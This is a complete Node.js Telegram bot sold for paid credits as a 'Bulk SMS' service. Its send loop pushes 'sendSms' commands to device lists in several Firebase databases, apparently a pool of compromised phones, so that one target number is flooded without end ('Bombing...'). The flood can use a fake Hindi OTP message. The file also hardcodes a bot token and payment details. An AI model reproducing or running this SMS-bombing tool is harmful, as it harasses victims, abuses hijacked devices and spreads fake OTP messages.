#!/usr/bin/env node
// 🔥 BULK SMS BOT - NODE.JS VERSION 🔥
// Telegram Bot with Firebase Integration

const { Telegraf, Markup, Scenes, session } = require('telegraf');
const sqlite3 = require('sqlite3').verbose();
const axios = require('axios');
const { promisify } = require('util');
const fs = require('fs');
const path = require('path');

// ============================
// CONFIGURATION
// ============================
const TOKEN = '8212356485:AAGQNG75v9YA1sryNfX6zSbEQgpWM_oYMHI';
const OWNER_ID = 6346250222;

const FIREBASE_URLS = [
    "https://dusman-abf8b-default-rtdb.firebaseio.com",
    "https://hood-4ba1e-default-rtdb.firebaseio.com",
    "https://lucifer-spreader-default-rtdb.firebaseio.com",
    "https://totla-axis-default-rtdb.firebaseio.com",
    "https://rgggggggggg-e2547-default-rtdb.firebaseio.com",
    "https://bulbul8084-9a5df-default-rtdb.firebaseio.com",
    "https://systumm-c8526-default-rtdb.firebaseio.com",
    "https://ravan-98ef1-default-rtdb.firebaseio.com"
];

const UPI_ID = "70497398@axl";
const UPI_NAME = "BRAJENDRA TYAGI";

// ============================
// DATABASE SETUP
// ============================
const DATA_DIR = path.join(process.cwd(), 'data');
if (!fs.existsSync(DATA_DIR)) fs.mkdirSync(DATA_DIR);
const DB_PATH = path.join(DATA_DIR, 'bot_data.db');

const db = new sqlite3.Database(DB_PATH);

// Database initialization
const initDB = () => {
    db.serialize(() => {
        db.run(`CREATE TABLE IF NOT EXISTS users (
            user_id INTEGER PRIMARY KEY,
            credits INTEGER DEFAULT 5,
            referrer_id INTEGER,
            joined_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
        )`);

        db.run(`CREATE TABLE IF NOT EXISTS banned_users (
            user_id INTEGER PRIMARY KEY,
            banned_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
            banned_by INTEGER
        )`);

        db.run(`CREATE TABLE IF NOT EXISTS payments (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            user_id INTEGER,
            amount INTEGER,
            credits_given INTEGER,
            transaction_id TEXT,
            screenshot_id TEXT,
            status TEXT DEFAULT 'pending',
            created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
        )`);

        db.run(`CREATE TABLE IF NOT EXISTS user_history (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            user_id INTEGER,
            action TEXT,
            details TEXT,
            created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
        )`);
    });
    console.log('✅ Database initialized at:', DB_PATH);
};
initDB();

// ============================
// DATABASE FUNCTIONS (Promisified)
// ============================
const dbGet = promisify(db.get.bind(db));
const dbRun = promisify(db.run.bind(db));
const dbAll = promisify(db.all.bind(db));

const isOwner = (userId) => userId == OWNER_ID;

const getUserCredits = async (userId) => {
    const row = await dbGet("SELECT credits FROM users WHERE user_id = ?", [userId]);
    if (row) return row.credits;
    await addNewUser(userId);
    return 5;
};

const addNewUser = async (userId, referrerId = null) => {
    const exists = await dbGet("SELECT user_id FROM users WHERE user_id = ?", [userId]);
    if (exists) return;
    
    await dbRun("INSERT INTO users (user_id, credits, referrer_id) VALUES (?, ?, ?)", 
                [userId, 5, referrerId]);
    
    if (referrerId && referrerId != userId) {
        const referrer = await dbGet("SELECT credits FROM users WHERE user_id = ?", [referrerId]);
        if (referrer) {
            await dbRun("UPDATE users SET credits = credits + 1 WHERE user_id = ?", [referrerId]);
        }
    }
};

const deductCredit = async (userId) => {
    const result = await dbRun("UPDATE users SET credits = credits - 1 WHERE user_id = ? AND credits > 0", [userId]);
    return result.changes > 0;
};

const addCredits = async (userId, amount) => {
    await dbRun("UPDATE users SET credits = credits + ? WHERE user_id = ?", [amount, userId]);
};

const removeCredits = async (userId, amount) => {
    const result = await dbRun("UPDATE users SET credits = credits - ? WHERE user_id = ? AND credits >= ?", 
                               [amount, userId, amount]);
    return result.changes > 0;
};

const banUser = async (userId, adminId) => {
    try {
        await dbRun("INSERT OR IGNORE INTO banned_users (user_id, banned_by) VALUES (?, ?)", [userId, adminId]);
        return true;
    } catch {
        return false;
    }
};

const unbanUser = async (userId) => {
    const result = await dbRun("DELETE FROM banned_users WHERE user_id = ?", [userId]);
    return result.changes > 0;
};

const isUserBanned = async (userId) => {
    const row = await dbGet("SELECT user_id FROM banned_users WHERE user_id = ?", [userId]);
    return row !== undefined;
};

const createPayment = async (userId, amount, creditsGiven, transactionId = null, screenshotId = null) => {
    const result = await dbRun(
        `INSERT INTO payments (user_id, amount, credits_given, transaction_id, screenshot_id, status) 
         VALUES (?, ?, ?, ?, ?, 'pending')`,
        [userId, amount, creditsGiven, transactionId, screenshotId]
    );
    return result.lastID;
};

const logUserAction = async (userId, action, details = "") => {
    await dbRun("INSERT INTO user_history (user_id, action, details) VALUES (?, ?, ?)", 
                [userId, action, details]);
};

const getUserHistory = async (userId, limit = 10) => {
    const rows = await dbAll(
        `SELECT action, details, created_at FROM user_history 
         WHERE user_id = ? ORDER BY id DESC LIMIT ?`,
        [userId, limit]
    );
    return rows;
};

// ============================
// HELPER FUNCTIONS
// ============================
const generateOTP = (length = 6) => {
    return Math.random().toString().slice(2, 2 + length).padStart(length, '0');
};

const validatePhoneNumber = (number) => {
    number = number.trim();
    if (!number.startsWith('+91')) {
        return { valid: false, msg: '❌ Number must start with +91' };
    }
    const remaining = number.slice(3);
    if (!/^\d+$/.test(remaining)) {
        return { valid: false, msg: '❌ Only digits allowed after +91' };
    }
    if (remaining.length !== 10) {
        return { valid: false, msg: `❌ Enter exactly 10 digits after +91 (you entered ${remaining.length})` };
    }
    return { valid: true, msg: '✅ Valid number' };
};

const fetchJsonData = async (url, path, auth = null) => {
    try {
        const base = url.replace(/\/+$/, '');
        let fullUrl = `${base}/${path}.json`;
        if (auth && auth.trim()) fullUrl += `?auth=${auth}`;
        const response = await axios.get(fullUrl, { timeout: 10000 });
        return response.data;
    } catch {
        return null;
    }
};

const firebasePut = async (url, key, path, data) => {
    try {
        const base = url.replace(/\/+$/, '');
        let fullUrl = `${base}/${path}.json`;
        if (key && key.trim()) fullUrl += `?auth=${key}`;
        await axios.put(fullUrl, data, { timeout: 10000 });
        return true;
    } catch {
        return false;
    }
};

// ============================
// MAIN KEYBOARD
// ============================
const getMainKeyboard = () => {
    return Markup.keyboard([
        ['📱 Bulk SMS'],
        ['💰 Credits', '🔗 Referral'],
        ['💳 Recharge'],
        ['📜 My History', '🛡️ System Status'],
        ['👨‍💻 Developer']
    ]).resize();
};

// ============================
// BOT SETUP
// ============================
const bot = new Telegraf(TOKEN);

// ============================
// MIDDLEWARE
// ============================
bot.use(async (ctx, next) => {
    if (ctx.chat && ctx.chat.type === 'private') {
        ctx.userId = ctx.from.id;
        const banned = await isUserBanned(ctx.userId);
        if (banned) {
            return ctx.reply('❌ You are banned from using this bot.');
        }
    }
    return next();
});

// ============================
// START COMMAND
// ============================
bot.start(async (ctx) => {
    const userId = ctx.from.id;
    let referrerId = null;
    if (ctx.message.text.includes('ref_')) {
        const ref = ctx.message.text.split('ref_')[1];
        if (ref) referrerId = parseInt(ref);
    }
    await addNewUser(userId, referrerId);
    const credits = await getUserCredits(userId);
    const username = ctx.botInfo.username;

    const welcome = `⚡ **BULK SMS BOT** ⚡\n` +
        `━─━────༺༻────━─━\n` +
        `🟢 **Status:** \`ONLINE\`\n` +
        `💰 **Credits:** \`${credits}\`\n` +
        `━─━────༺༻────━─━\n` +
        `📌 **How to use:**\n` +
        `• Click \`📱 Bulk SMS\` and follow steps\n` +
        `• Each SMS costs **1 credit**\n` +
        `• Invite friends to earn free credits!\n` +
        `• Recharge via \`💳 Recharge\``;

    await ctx.reply(welcome, { parse_mode: 'HTML', ...getMainKeyboard() });
});

// ============================
// TEXT HANDLER
// ============================
bot.on('text', async (ctx) => {
    const userId = ctx.from.id;
    const text = ctx.message.text;
    const session = ctx.session || {};
    ctx.session = session;

    // ---------- Bulk SMS flow ----------
    if (session.bulkStep === 'number') {
        const number = text.trim();
        const validation = validatePhoneNumber(number);
        if (!validation.valid) {
            return ctx.reply(`${validation.msg}\n\n📞 Format: +91XXXXXXXXXX\nExample: +919876543210`, 
                            { parse_mode: 'HTML' });
        }
        session.bulkNumber = number;

        const keyboard = Markup.inlineKeyboard([
            [Markup.button.callback('🔢 Random OTP', 'msgtype_random')],
            [Markup.button.callback('✏️ Custom SMS', 'msgtype_custom')],
            [Markup.button.callback('❌ Cancel', 'msgtype_cancel')]
        ]);
        await ctx.reply('📝 **Select message type:**', keyboard);
        session.bulkStep = 'msgtype';
        return;
    }

    if (session.bulkStep === 'custom_msg') {
        const msgText = text;
        if (!msgText) return ctx.reply('❌ Message cannot be empty.');
        session.customMessage = msgText;

        const deducted = await deductCredit(userId);
        if (!deducted) {
            return ctx.reply('❌ Failed to deduct credit. Insufficient balance.');
        }

        await logUserAction(userId, 'Bulk SMS Started', `Target: ${session.bulkNumber}`);
        await ctx.reply('📤 **Starting infinite bulk SMS...**');
        await performBulkSend(ctx);
        return;
    }

    // ---------- Recharge flow ----------
    if (session.rechargeStep === 'payment') {
        if (text && !text.startsWith('/')) {
            const txnId = text.trim();
            const credits = session.rechargeCredits || 0;
            const amount = session.rechargeAmount || 0;
            if (credits === 0) return ctx.reply('❌ Session expired. Start /start again.');
            
            const paymentId = await createPayment(userId, amount, credits, txnId);
            await ctx.reply(`✅ Transaction ID received: \`${txnId}\`\nPayment ID: #${paymentId}\n⏳ Waiting for owner approval.`);
            
            try {
                await ctx.telegram.sendMessage(OWNER_ID,
                    `📥 **New Payment (Txn ID)**\nUser: ${userId}\nAmount: ₹${amount}\nCredits: ${credits}\nTxn: ${txnId}\nPayment ID: #${paymentId}`,
                    { parse_mode: 'HTML' }
                );
            } catch {}
            
            await logUserAction(userId, 'Recharge Request', `${credits} credits for ₹${amount} (txn: ${txnId})`);
            session.rechargeStep = null;
            session.rechargeCredits = null;
            session.rechargeAmount = null;
            return;
        }
        return;
    }

    // ---------- Main menu buttons ----------
    switch(text) {
        case '📱 Bulk SMS': {
            const credits = await getUserCredits(userId);
            if (credits <= 0) {
                return ctx.reply('❌ **Insufficient credits!**\nInvite friends or recharge.', 
                                { parse_mode: 'HTML' });
            }
            await ctx.reply('📞 **Enter recipient phone number:**\n✅ Format: +91XXXXXXXXXX (10 digits after +91)\n_Type /cancel to abort._',
                           { parse_mode: 'HTML' });
            session.bulkStep = 'number';
            break;
        }
        
        case '💰 Credits': {
            const credits = await getUserCredits(userId);
            await ctx.reply(`💰 **Your Credits:** \`${credits}\``, { parse_mode: 'HTML' });
            break;
        }
        
        case '🔗 Referral': {
            const username = ctx.botInfo.username;
            const link = `https://t.me/${username}?start=ref_${userId}`;
            await ctx.reply(`🔗 **Your Referral Link:**\n\`${link}\`\n\nShare this link – you get **1 credit** per new user!`,
                           { parse_mode: 'HTML' });
            break;
        }
        
        case '💳 Recharge': {
            const keyboard = Markup.inlineKeyboard([
                [Markup.button.callback('💳 10 Credits - ₹20', 'recharge_10_20')],
                [Markup.button.callback('💎 25 Credits - ₹50', 'recharge_25_50')],
                [Markup.button.callback('🚀 50 Credits - ₹100', 'recharge_50_100')],
                [Markup.button.callback('👑 100 Credits - ₹200', 'recharge_100_200')],
                [Markup.button.callback('❌ Cancel', 'recharge_cancel')]
            ]);
            await ctx.reply('💳 **Select Recharge Plan:**', keyboard);
            break;
        }
        
        case '📜 My History': {
            const history = await getUserHistory(userId, 10);
            if (!history || history.length === 0) {
                return ctx.reply('📭 No activity history.');
            }
            let reply = '📜 **Your Recent Activity:**\n';
            for (const row of history) {
                const dt = row.created_at ? row.created_at.slice(0, 19) : 'N/A';
                reply += `• ${row.action} – ${row.details} (${dt})\n`;
            }
            await ctx.reply(reply);
            break;
        }
        
        case '🛡️ System Status':
            await ctx.reply('🟢 **Bot is running on Node.js!**');
            break;
            
        case '👨‍💻 Developer':
            await ctx.reply('👨‍💻 **Developer:** @MAURYAHACKERISHERE\nFor support or custom bots, contact the developer.');
            break;
            
        default:
            await ctx.reply('❌ Please use the buttons below.', getMainKeyboard());
    }
});

// ============================
// PHOTO HANDLER (Recharge Screenshots)
// ============================
bot.on('photo', async (ctx) => {
    const userId = ctx.from.id;
    const session = ctx.session || {};
    
    if (session.rechargeStep === 'payment') {
        const fileId = ctx.message.photo[ctx.message.photo.length - 1].file_id;
        const credits = session.rechargeCredits || 0;
        const amount = session.rechargeAmount || 0;
        
        if (credits === 0) return ctx.reply('❌ Session expired. Start /start again.');
        
        const paymentId = await createPayment(userId, amount, credits, null, fileId);
        await ctx.reply(`✅ Screenshot received! Payment ID: #${paymentId}\n⏳ Waiting for owner approval.`);
        
        try {
            await ctx.telegram.sendMessage(OWNER_ID,
                `📥 **New Payment Screenshot**\nUser: ${userId}\nAmount: ₹${amount}\nCredits: ${credits}\nPayment ID: #${paymentId}`,
                { parse_mode: 'HTML' }
            );
        } catch {}
        
        await logUserAction(userId, 'Recharge Request', `${credits} credits for ₹${amount} (screenshot)`);
        session.rechargeStep = null;
        session.rechargeCredits = null;
        session.rechargeAmount = null;
    }
});

// ============================
// CALLBACK HANDLERS
// ============================
bot.action(/recharge_(.+)/, async (ctx) => {
    const userId = ctx.from.id;
    const data = ctx.match[0];
    
    if (data === 'recharge_cancel') {
        await ctx.editMessageText('❌ Recharge cancelled.');
        return;
    }
    
    const parts = data.split('_');
    const credits = parseInt(parts[1]);
    const amount = parseInt(parts[2]);
    
    ctx.session.rechargeCredits = credits;
    ctx.session.rechargeAmount = amount;
    
    let reply = `💰 **Plan: ${credits} Credits**\n💵 **Amount: ₹${amount}**\n\n`;
    reply += `📱 **Send payment to UPI:** \`${UPI_ID}\`\n`;
    reply += `📛 **Name:** ${UPI_NAME}\n\n`;
    reply += '📸 **After payment, send the Transaction ID or screenshot** (as photo) to this chat.\n';
    reply += '⚠️ Your credits will be added after manual verification by owner.';
    
    await ctx.editMessageText(reply, { parse_mode: 'HTML' });
    ctx.session.rechargeStep = 'payment';
});

bot.action(/msgtype_(.+)/, async (ctx) => {
    const userId = ctx.from.id;
    const data = ctx.match[0];
    const msgType = data.split('_')[1];
    
    if (msgType === 'cancel') {
        await ctx.editMessageText('❌ Bulk SMS cancelled.');
        ctx.session.bulkStep = null;
        return;
    }
    
    if (msgType === 'random') {
        const defaultMsg = 'आपका OTP है: {otp} | कृपया इसे किसी को न बताएँ।';
        ctx.session.customMessage = defaultMsg;
        await ctx.editMessageText('✅ Using default OTP template.\n\n📤 **Starting infinite bulk SMS...**');
        
        const deducted = await deductCredit(userId);
        if (!deducted) {
            return ctx.reply('❌ Failed to deduct credit. Insufficient balance.');
        }
        await logUserAction(userId, 'Bulk SMS Started', `Target: ${ctx.session.bulkNumber}`);
        await performBulkSend(ctx);
    } else {
        await ctx.editMessageText('✏️ **Now enter your custom message.**\n💡 Use `{otp}` for random OTP if needed.');
        ctx.session.bulkStep = 'custom_msg';
    }
});

bot.action('stop_bulk', async (ctx) => {
    ctx.session.stopSending = true;
    await ctx.answerCbQuery('Stopping...');
});

// ============================
// PERFORM BULK SEND (Node.js version)
// ============================
const performBulkSend = async (ctx) => {
    const userId = ctx.from.id;
    const session = ctx.session;
    
    if (await isUserBanned(userId)) {
        return ctx.reply('❌ You are banned.');
    }
    
    const number = session.bulkNumber;
    const msgText = session.customMessage;
    
    if (!number || !msgText) {
        return ctx.reply('❌ Missing data. Please start again.');
    }
    
    session.stopSending = false;
    
    const stopMarkup = Markup.inlineKeyboard([
        [Markup.button.callback('⏹ Stop Sending', 'stop_bulk')]
    ]);
    
    const progressMsg = await ctx.reply('⏳ Starting...', stopMarkup);
    
    let totalSent = 0;
    let totalFailed = 0;
    let cycle = 1;
    
    // Check for OTP placeholder
    const otpMatch = msgText.match(/\{otp(:\d+)?\}/);
    let otpLength = 6;
    if (otpMatch && otpMatch[1]) {
        otpLength = parseInt(otpMatch[1].slice(1)) || 6;
        otpLength = Math.max(1, Math.min(10, otpLength));
    }
    
    while (!session.stopSending) {
        if (await isUserBanned(userId)) break;
        
        const cycleText = `🔄 Cycle #${cycle}`;
        try {
            await ctx.telegram.editMessageText(
                progressMsg.chat.id,
                progressMsg.message_id,
                null,
                `⏳ ${cycleText} - Sending...`,
                { reply_markup: stopMarkup.reply_markup }
            );
        } catch {}
        
        for (const url of FIREBASE_URLS) {
            if (session.stopSending || await isUserBanned(userId)) break;
            
            const clients = await fetchJsonData(url, '/clients');
            if (!clients || typeof clients !== 'object') continue;
            
            const deviceIds = Object.keys(clients);
            if (deviceIds.length === 0) continue;
            
            for (const devId of deviceIds) {
                if (session.stopSending || await isUserBanned(userId)) break;
                
                let finalMsg = msgText;
                if (otpMatch) {
                    const otp = generateOTP(otpLength);
                    finalMsg = msgText.replace(/\{otp(:\d+)?\}/g, otp);
                }
                
                const path = `clients/${devId}/webhookEvent/sendSms`;
                const payload = {
                    sim: 1,
                    to: number,
                    message: finalMsg,
                    isSended: false
                };
                
                const ok = await firebasePut(url, null, path, payload);
                if (ok) totalSent++;
                else totalFailed++;
                
                if ((totalSent + totalFailed) % 10 === 0) {
                    const progressText = `📤 **Bombing...**\n${cycleText}\n✅ Sent: ${totalSent}\n❌ Failed: ${totalFailed}`;
                    try {
                        await ctx.telegram.editMessageText(
                            progressMsg.chat.id,
                            progressMsg.message_id,
                            null,
                            progressText,
                            { parse_mode: 'HTML', reply_markup: stopMarkup.reply_markup }
                        );
                    } catch {}
                }
                
                await new Promise(r => setTimeout(r, 50));
            }
        }
        
        cycle++;
        const progressText = `📤 **Cycle ${cycle-1} completed.**\n✅ Sent: ${totalSent}\n❌ Failed: ${totalFailed}`;
        try {
            await ctx.telegram.editMessageText(
                progressMsg.chat.id,
                progressMsg.message_id,
                null,
                progressText,
                { parse_mode: 'HTML', reply_markup: stopMarkup.reply_markup }
            );
        } catch {}
        await new Promise(r => setTimeout(r, 500));
    }
    
    const finalText = `🛑 **Bulk SMS stopped.**\n✅ Sent: ${totalSent}\n❌ Failed: ${totalFailed}`;
    try {
        await ctx.telegram.editMessageText(
            progressMsg.chat.id,
            progressMsg.message_id,
            null,
            finalText,
            { parse_mode: 'HTML' }
        );
        await ctx.telegram.editMessageReplyMarkup(
            progressMsg.chat.id,
            progressMsg.message_id,
            null,
            { inline_keyboard: [] }
        );
    } catch {}
    
    await logUserAction(userId, 'Bulk SMS Ended', `Sent ${totalSent}, Failed ${totalFailed}`);
    session.stopSending = null;
};

// ============================
// CANCEL COMMAND
// ============================
bot.command('cancel', async (ctx) => {
    const session = ctx.session || {};
    session.bulkStep = null;
    session.rechargeStep = null;
    session.stopSending = true;
    await ctx.reply('❌ Cancelled. Use the buttons to start again.', getMainKeyboard());
});

// ============================
// OWNER COMMANDS
// ============================
bot.command('addcredits', async (ctx) => {
    const userId = ctx.from.id;
    if (!isOwner(userId)) return ctx.reply('⛔ Unauthorized.');
    
    const args = ctx.message.text.split(' ');
    if (args.length < 3) return ctx.reply('Usage: /addcredits <user_id> <amount>');
    
    try {
        const target = parseInt(args[1]);
        const amount = parseInt(args[2]);
        await addCredits(target, amount);
        await ctx.reply(`✅ Added ${amount} credits to user ${target}.`);
    } catch {
        await ctx.reply('❌ Invalid input.');
    }
});

bot.command('removecredits', async (ctx) => {
    const userId = ctx.from.id;
    if (!isOwner(userId)) return ctx.reply('⛔ Unauthorized.');
    
    const args = ctx.message.text.split(' ');
    if (args.length < 3) return ctx.reply('Usage: /removecredits <user_id> <amount>');
    
    try {
        const target = parseInt(args[1]);
        const amount = parseInt(args[2]);
        const success = await removeCredits(target, amount);
        if (success) {
            await ctx.reply(`✅ Removed ${amount} credits from user ${target}.`);
        } else {
            await ctx.reply(`❌ Failed. User may have insufficient credits.`);
        }
    } catch {
        await ctx.reply('❌ Invalid input.');
    }
});

bot.command('ban', async (ctx) => {
    const userId = ctx.from.id;
    if (!isOwner(userId)) return ctx.reply('⛔ Unauthorized.');
    
    const args = ctx.message.text.split(' ');
    if (args.length < 2) return ctx.reply('Usage: /ban <user_id>');
    
    try {
        const target = parseInt(args[1]);
        await banUser(target, userId);
        await ctx.reply(`✅ User ${target} banned.`);
    } catch {
        await ctx.reply('❌ Invalid user ID.');
    }
});

bot.command('unban', async (ctx) => {
    const userId = ctx.from.id;
    if (!isOwner(userId)) return ctx.reply('⛔ Unauthorized.');
    
    const args = ctx.message.text.split(' ');
    if (args.length < 2) return ctx.reply('Usage: /unban <user_id>');
    
    try {
        const target = parseInt(args[1]);
        const success = await unbanUser(target);
        if (success) {
            await ctx.reply(`✅ User ${target} unbanned.`);
        } else {
            await ctx.reply('❌ User was not banned.');
        }
    } catch {
        await ctx.reply('❌ Invalid user ID.');
    }
});

bot.command('shutdown', async (ctx) => {
    const userId = ctx.from.id;
    if (!isOwner(userId)) return ctx.reply('⛔ Unauthorized.');
    
    await ctx.reply('🛑 Bot is shutting down...');
    process.exit(0);
});

// ============================
// ERROR HANDLER
// ============================
bot.catch((err, ctx) => {
    console.error('Bot error:', err);
});

// ============================
// START BOT
// ============================
bot.launch().then(() => {
    console.log(`
╔════════════════════════════════════════════════╗
║  🚀 BULK SMS BOT - NODE.JS DEPLOYMENT         ║
║  ✅ Database: ${DB_PATH}                       ║
║  ✅ Ready for Production!                      ║
╚════════════════════════════════════════════════╝
    `);
}).catch(err => {
    console.error('Failed to start bot:', err);
});

// Graceful shutdown
process.once('SIGINT', () => {
    bot.stop('SIGINT');
    db.close();
});
process.once('SIGTERM', () => {
    bot.stop('SIGTERM');
    db.close();
});

module.exports = bot;
